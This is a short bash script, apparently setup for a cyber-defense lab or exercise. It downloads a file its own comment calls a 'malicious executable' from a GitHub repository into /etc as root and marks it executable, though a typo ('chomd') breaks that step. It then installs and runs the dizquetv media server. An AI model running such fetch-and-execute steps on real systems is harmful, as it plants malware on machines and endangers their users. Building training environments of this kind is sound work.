#!/bin/bash

#Download malicious executable
cd /etc
sudo wget "https://github.com/acebird/CyberforceLabs/raw/refs/heads/main/executable"
sudo chomd +x executable

#Install and run dizquetv
cd /etc
sudo mkdir dizquetv
cd dizquetv
sudo wget "https://github.com/vexorian/dizquetv/releases/download/1.5.3/dizquetv-linux-x64"
sudo chmod +x dizquetv-linux-x64
sudo ./dizquetv-linux-x64&

